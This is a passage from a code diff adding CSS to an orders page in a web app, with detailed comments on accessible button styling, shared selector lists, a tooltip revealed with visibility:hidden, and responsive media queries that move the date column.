+             on the page renders CENTRED against four start/end-aligned columns with its loose
+             text in bold. "start", never "left" - the source gate forbids physical directions
+             and text-align:left matches it. */
+          .ord-td{
+            padding:16px;font-size:16px;line-height:1.5;color:#1a1a1a;vertical-align:top;
+            text-align:start;font-weight:400;
+          }
+          .ord-td-num{text-align:end;font-variant-numeric:tabular-nums}
+          .ord-ordno{font-size:16px;font-weight:700;letter-spacing:-.25px;color:#1a1a1a;overflow-wrap:anywhere}
+
+          /* The 14px/400/rgba(0,0,0,.54) sub-line rung, shared by all three sub-lines below the
+             identifier. Not 13px: a one-pixel "table cells are tighter" exception is not a
+             reason to leave the ladder. */
+          .ord-ref{display:block;font-size:14px;font-weight:400;color:rgba(0,0,0,.54)}
+          /* Same rung, but it is the Date column's understudy: hidden while that column is
+             visible, so the date renders EXACTLY ONCE at every width. Declared display:none
+             here, ahead of every media query, and flipped in the SAME query that hides the
+             column it replaces - separating the two is what once rendered the date twice above
+             767px, and a test that checked only the column would have passed on it. */
+          .ord-subdate{display:none;font-size:14px;font-weight:400;color:rgba(0,0,0,.54)}
+          .ord-invnote{display:block;font-size:14px;font-weight:400;color:rgba(0,0,0,.54)}
+
+          .ord-ordbtn{
+            display:inline-flex;align-items:center;gap:8px;min-height:44px;
+            margin:0;padding:0;border:0;background:none;cursor:pointer;
+            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
+            text-align:start;color:#1a1a1a;
+            text-decoration:underline;text-decoration-thickness:1px;text-underline-offset:2px;
+          }
+          /* 1px at rest, 2px on hover and focus - the hairline split applied to a TEXT
+             affordance rather than to a border, so the "2px means hoverable" signal still holds
+             without inventing a boxed control inside a table cell. The vocabulary is
+             .ord-link's, reused rather than coined. */
+          .ord-ordbtn:hover,.ord-ordbtn:focus-visible{text-decoration-thickness:2px}
+          .ord-ordbtn:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
+          .ord-caret{font-size:12px;color:#1a3a2a}
+
+          .ord-tr-open{background:rgba(209,244,112,.22)}
+          .ord-detailcell{padding:0 16px 18px;border-block-end:1px solid #e5e7eb}
+          .ord-live{font-size:14px;color:rgba(0,0,0,.54)}
+
+          /* THE ONE PERMITTED HIDE MECHANISM ON THIS PAGE, and it appears exactly once.
+             visibility:hidden KEEPS the box, so revealing the hint shifts nothing - which a
+             display:none -> block swap or a conditional render would not. It cannot be an
+             absolutely positioned popover: .ord-tablewrap sets overflow-x:auto, and a container
+             with overflow-x:auto computes overflow-y to auto as well, so anything absolutely
+             positioned inside it is clipped vertically. That is why InfoTooltip renders through
+             a portal - and a portal's content sits outside this return tree, where styled-jsx
+             cannot stamp it. The text here is REDUNDANT (the button's visible word is "Copy" and
+             its accessible name is "Copy order ID <id>"), so nothing is available only on hover
+             and there is nothing for a touch user to miss. */
+          .ord-tip{
+            display:block;visibility:hidden;
+            font-size:14px;font-weight:400;color:rgba(0,0,0,.54);
+          }
+          .ord-copy:hover ~ .ord-tip,.ord-copy:focus-visible ~ .ord-tip,.ord-tip-on{visibility:visible}
+
           .ord-facts{margin:0;display:grid;grid-template-columns:96px 1fr;gap:8px 12px;align-items:baseline}
           .ord-facts dt{font-size:12px;font-weight:700;color:#1a3a2a}
           .ord-facts dd{margin:0;font-size:16px;line-height:1.5;color:#1a1a1a}
@@ -688,21 +1289,64 @@ export default function OrdersPage (): React.ReactElement {
              control is identified by its <button> semantics and its #1a3a2a-on-white label, not
              by the edge - #d1f470 on white is 1.24:1 and does not clear 1.4.11 on its own - and
              the focus indicator is the dark outline. */
-          .ord-quiet{
+          /* THE INVOICE AND COPY CONTROLS ARE NEW SIZES OF THIS, NOT NEW BUTTONS, and
+             "inherits" is not a CSS mechanism - so the mechanism is to EXTEND this selector
+             list. Nothing in the body changes. A duplicated block was rejected by name: two
+             copies of border:2px solid #d1f470 and min-height:44px drift independently, and
+             the tap-target gate would then pass on whichever copy still said 44px. Two of these
+             classes on one element was rejected too - the override would depend on source order
+             between two classes of equal specificity, which is the fragility that gets "fixed"
+             with !important.
+
+             The first :disabled selector is kept on purpose: dropping it would stop dimming
+             "Show more orders" at rest. align-self:flex-start comes along from this body and is
+             inert inside a <td>, which is not a flex container - noted so it is not read as a
+             mistake. */
+          .ord-quiet,.ord-inv,.ord-copy{
             align-self:flex-start;display:inline-flex;align-items:center;justify-content:center;
             min-height:44px;padding:0 24px;border:2px solid #d1f470;border-radius:50px;
             background:#fff;color:#1a3a2a;font:inherit;font-size:17px;font-weight:600;cursor:pointer;
           }
-          .ord-quiet:hover:not(:disabled){background:rgba(209,244,112,.22)}
-          .ord-quiet:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
-          .ord-quiet:disabled{opacity:.55;cursor:default}
+          .ord-quiet:hover:not(:disabled),.ord-inv:hover:not(:disabled),.ord-copy:hover:not(:disabled){background:rgba(209,244,112,.22)}
+          .ord-quiet:focus-visible,.ord-inv:focus-visible,.ord-copy:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
+          .ord-quiet:disabled,.ord-inv:disabled,.ord-copy:disabled{opacity:.55;cursor:default}
+
+          /* The only differences, as overrides AFTER the shared body. font-size has to be
+             re-stated because that body sets font:inherit, a shorthand that resets it. */
+          .ord-inv{font-size:15px;padding:0 16px}
+          .ord-copy{font-size:14px;padding:0 12px;margin-inline-start:12px}
 
           .ord-list,.ord-empty{display:flex;flex-direction:column;align-items:flex-start;gap:18px}
           .ord-list .ord-h2,.ord-empty .ord-h2{margin:0}
 
+          /* EVERY MEDIA QUERY LIVES BELOW HERE, after the defaults it overrides. */
+          @media(min-width:1024px){
+            /* minmax(0,1fr) IS NOT OPTIONAL and is the single most important line here. A
+               bare 1fr is minmax(auto,1fr), so the column refuses to shrink below its content's
+               intrinsic width, a wide table blows the grid out, and the overflow lands on the
+               DOCUMENT - which is what tools/browser/devicecheck.js measures
+               (document.documentElement.scrollWidth - vw) and fails on at 280px. With
+               minmax(0,...) the column shrinks and the table's own scroll container takes it.
+
+               1024px rather than the site's 767px body rung: a 340px panel beside a table needs
+               about 1024px before the table has usable room. */
+            .ord-shell{grid-template-columns:340px minmax(0,1fr);gap:32px;align-items:start}
+            /* Collapsed while the editor is open. CheckoutProfile's own grid is 1fr 1fr 1.5fr
+               and AddressFields' is 1fr 1fr, and both collapse only at a max-width:767px
+               VIEWPORT query - not a container query - so inside a 340px panel on a 1280px
+               desktop they would stay three- and two-up and render crushed inputs. Fixing that
+               properly means container queries on two shared components another phase owns. */
+            .ord-shell-editing{grid-template-columns:1fr}
+          }
+
           @media(max-width:767px){
             .ord-p,.ord-aside{font-size:18px}
             .ord-facts{grid-template-columns:1fr;gap:4px}
+            /* BOTH HALVES OF THE FOLD, IN ONE QUERY. The fold hides a COLUMN, so the class sits
+               on the <th> and the <td> together - a class on only the header leaves the data
+               visible under a vanished header and the column indices stop agreeing. */
+            .ord-col-date{display:none}
+            .ord-subdate{display:block}
           }
 
           /* NO ENTRANCE ANIMATION OF ITS OWN, and the absence is the point: opacity:0 does not
